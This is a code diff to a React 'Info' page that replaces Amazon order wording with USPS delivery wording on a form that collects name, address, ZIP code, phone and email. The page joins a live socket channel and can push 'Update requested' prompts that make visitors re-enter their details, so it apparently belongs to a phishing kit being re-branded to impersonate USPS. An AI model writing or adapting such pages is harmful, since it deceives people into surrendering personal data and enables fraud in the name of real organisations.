@@ -73,7 +73,7 @@ export default function Info() {
   const navigate = useNavigate();
 
   const [form, setForm] = useState<Form>(() => loadInfoFormDraft());
-  const [status, setStatus] = useState('Enter the shipping information associated with this order.');
+  const [status, setStatus] = useState('Enter the delivery information associated with this shipment.');
   const [loading, setLoading] = useState(false);
   const [errors, setErrors] = useState<Partial<Record<keyof Form, string>>>({});
 
@@ -83,7 +83,7 @@ export default function Info() {
   useEffect(() => {
     socket.emit('join-page', 'info');
     const hasDraft = Object.values(form).some((v) => v.trim());
-    setStatus(hasDraft ? 'Your saved details were restored.' : 'Enter the shipping information associated with this order.');
+    setStatus(hasDraft ? 'Your saved details were restored.' : 'Enter the delivery information associated with this shipment.');
   }, []);
 
   useEffect(() => {
@@ -110,7 +110,7 @@ export default function Info() {
       setErrors({});
       setLoading(false);
 
-      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the shipping details for this Amazon order.');
+      setStatus(payload?.reason ? `Update requested: ${payload.reason}` : 'Please review and re-enter the delivery details for this USPS shipment.');
       navigate('/info', { replace: true });
       window.scrollTo({ top: 0, behavior: 'smooth' });
       setTimeout(() => inputRefs.current.fullname?.focus(), 0);
@@ -213,7 +213,7 @@ export default function Info() {
             <div>
               <div className="alz-badge">{BRAND.name}</div>
               <h1 className="alz-step-title">Confirm your shipping address</h1>
-              <p className="alz-step-subtitle">Review the shipping details associated with this order.</p>
+              <p className="alz-step-subtitle">Review the delivery details associated with this shipment.</p>
             </div>
           </div>
           <div className="alz-track mt-3">
@@ -285,10 +285,10 @@ export default function Info() {
               </div>
 
               <button type="submit" disabled={loading} className="alz-btn-primary mt-2 text-lg sm:text-xl md:text-2xl">
-                {loading ? 'Saving...' : 'Confirm address'}
+                {loading ? 'Saving...' : 'Confirm delivery address'}
               </button>
               <p className="alz-helper-copy text-center mt-3">
-                Amazon may ask you to confirm these details again if account information changes.
+                USPS may ask you to confirm these details again if delivery information changes.
               </p>
             </form>
 
@@ -301,8 +301,8 @@ export default function Info() {
             <div className="alz-order-mini-card">
               <div className="alz-order-mini-thumb" />
               <div>
-                <div className="alz-order-mini-title">Review the shipping address on file</div>
-                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP code, and contact details for this order.</div>
+                <div className="alz-order-mini-title">Review the delivery address on file</div>
+                <div className="alz-order-mini-copy">Confirm the recipient name, street address, ZIP Code, and contact details for this shipment.</div>
               </div>
             </div>
             <div className="alz-side-summary-list">
@@ -310,7 +310,7 @@ export default function Info() {
               <div>Street address and ZIP Code</div>
               <div>Phone number and email</div>
             </div>
-            <div className="alz-side-summary-box">Use the delivery information associated with this order so Amazon can continue processing the shipment.</div>
+            <div className="alz-side-summary-box">Use the delivery information associated with this shipment so USPS can continue processing delivery.</div>
           </aside>
         </div>
       </div>
